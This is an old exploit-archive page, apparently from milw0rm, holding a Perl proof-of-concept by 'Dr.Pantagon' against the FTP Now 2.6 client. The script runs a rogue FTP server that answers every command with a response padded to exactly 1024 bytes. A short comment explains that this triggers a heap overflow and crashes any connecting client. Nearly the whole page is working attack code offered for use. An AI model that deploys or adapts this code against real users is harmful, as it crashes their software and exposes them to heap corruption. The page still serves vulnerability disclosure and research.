<html><head><title>FTP Now 2.6 Server Response Remote Crash PoC</title></head><pre>#!/usr/bin/perl
# By Dr.Pantagon
# www.deltasecurity.ir
# DeltaSecurityCenter
# Special Tnx D_7J AND H!V++
# FTP Now version 2.6 Server Response PoC
# Usage: ./ftpnow.pl [IP]
# Download Link : http://www.network-client.com/ftpnow/FTPNow26.exe
#
# Details: The response is broken into buffers, either at length 1024,
#                  or at '\r\n'. Each buffer is apended with \x00, without
#                  bounds checking.  If the response is exctly 1024 characters
#                  in length, you will overflow the heap with the string \x00.


use IO::Socket;
use strict;

# Create listener
my $ip=shift || '127.0.0.1';  # Default ip
my $sock = IO::Socket::INET-&gt;new(Listen=&gt;1,
                                 LocalHost=&gt;$ip,
                                                     LocalPort=&gt;'21',  #Default port
                                                             Proto=&gt;'tcp');
$sock or die (&quot;Could not create listener.\nMake sure no FTP server is running, and you are running this as root.\n&quot;);

# Wait for initial connection and send banner
my $sock_in = $sock-&gt;accept();
print $sock_in &quot;220 dara daram , dara daram :D \r\n&quot;;

# Send response code with total lenght of response = 1024
while (&lt;$sock_in&gt;){
       my $response;
       if($_ eq &quot;USER&quot;) { $response=&quot;331 &quot;;}
       elsif($_ eq &quot;PASS&quot;) { $response=&quot;230 &quot;;}
       elsif($_ eq &quot;syst&quot;) { $response=&quot;215 &quot;;}
       elsif($_ eq &quot;CWD&quot;) { $response=&quot;250 &quot;;}
       elsif($_ eq &quot;PWD&quot;) { $response=&quot;230 &quot;;}
       else { $response=&quot;200 &quot;;}
       print $sock_in $response.&quot;A&quot;x(1024-length($response)-2).&quot;\r\n&quot;;
}
close($sock);

# milw0rm.com [2008-11-01]</pre></html>